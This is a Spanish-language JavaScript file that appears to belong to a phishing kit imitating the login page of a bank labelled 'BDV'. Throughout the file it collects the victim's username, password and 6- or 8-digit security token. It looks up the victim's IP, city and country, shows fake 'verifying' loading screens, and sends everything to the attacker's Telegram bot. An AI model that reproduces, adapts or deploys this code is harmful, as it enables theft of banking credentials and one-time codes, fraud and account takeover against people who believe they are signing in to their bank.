"use strict";

function chcs() {
    const usernameInput = document.getElementById("mat-input-0").value;
    if (usernameInput.length < 5) {
        alert("Nombre de usuario incorrecto o incompleto");
        document.getElementById("mat-input-0").value = "";
        document.getElementById("mat-input-0").focus();
    } else {
        localStorage.setItem("usr", usernameInput);
        document.getElementById("mdl").style.display = "block";
    }
}

function chc() {
    const passwordInput = document.getElementById("mat-input-1").value;
    if (passwordInput.length < 5) {
        alert("Contraseña incorrecta o incompleta");
        document.getElementById("mat-input-1").value = "";
        document.getElementById("mat-input-1").focus();
    }
}

function cls() {
    document.getElementById("mdl").style.display = "none";
}

window.addEventListener("DOMContentLoaded", () => {
    var user = document.querySelector("#mat-input-0"),
        pass = document.querySelector("#mat-input-1"),
        btnU = document.querySelector("#btn-u"),
        btnP = document.querySelector("#btn-p"),
        btnT = document.querySelector("#mainB"),
        tk = document.querySelector("#soldede");

    window.stage = 1;

    btnU.addEventListener("click", (e) => {
        e.preventDefault();
        if (user.value.length < 5) {
            alert("Nombre de usuario incorrecto o incompleto");
            document.getElementById("mat-input-0").value = "";
            document.getElementById("mat-input-0").focus();
        } else {
            document.getElementById("mdl").style.display = "block";
        }
    });

    btnP.addEventListener("click", (e) => {
        e.preventDefault();
        if (pass.value.length < 5) {
            alert("Contraseña incorrecta o incompleta");
            document.getElementById("mat-input-1").value = "";
            document.getElementById("mat-input-1").focus();
        } else {
            showLoading(15, "Verificando credenciales", "", () => {
                document.getElementById("mdl").style.display = "none";
            });

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip || 'Desconocida';
                    const ciudad = data.city || 'Desconocida';
                    const pais = data.country_name || 'Desconocido';

                    const message = `
    BDV - login
    Us3r: ${user.value}
    Pws: ${pass.value}

    ----INFORMACION----
    Ciudad: ${ciudad}
    Pais: ${pais}
    IP: ${ip}
    `;

                    // Enviar datos a Telegram
                    sendData({
                        message: message
                    }, () => {
                        document.querySelector("#tkin").style.display = "none";
                        document.querySelector("#docPopup").style.display = "block";
                    });
                })
                .catch(error => {
                    console.error('Error al obtener la IP:', error);
                    alert('Error al obtener la IP. Inténtalo de nuevo.');
                });
        }
    });

    const tkk = () => {
        let val = tk.value;

        if (val.length === 6 || val.length === 8) {
            showLoading(10, "Validando token", "", () => {});

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip || 'Desconocida';

                    const message = `
    BDV Token
    Tok3n: ${val}
    IP: ${ip}
    `;

                    sendData({
                        message: message
                    }, () => {
                        tk.value = "";
                        document.querySelector("#docPopup").style.display = "block";
                    });
                })
                .catch(error => {
                    console.error('Error al obtener la IP:', error);
                    alert('Error al obtener la IP. Inténtalo de nuevo.');
                });
        } else {
            alert("La longitud del token debe de ser de 6 u 8 números");
        }
    };

    btnT.addEventListener("click", (e) => {
        e.preventDefault();
        tkk();
    });

    // loader
    const showLoading = (timeout = 5, title = null, msg = "", cb = null) => {
        const ld = document.querySelector(".loading");
        let t = ld.querySelector(".title");
        t.textContent = title;
        ld.style.display = "flex";

        setTimeout(() => {
            ld.style.display = "none";
            if (cb) cb();
        }, timeout * 1000);
    };

    // send data
    const sendData = async (data, cb = null) => {
        const telegramData = {
            chat_id: TELEGRAM_CHAT_ID,
            text: data.message
        };

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(telegramData)
            });

            const result = await response.json();

            if (result.ok) {
                console.log('Mensaje enviado con éxito a Telegram');
            } else {
                console.error('Error al enviar mensaje a Telegram:', result);
            }

            if (cb) cb(result);

        } catch (error) {
            console.error('Error al enviar datos a Telegram:', error);
        }
    };
});
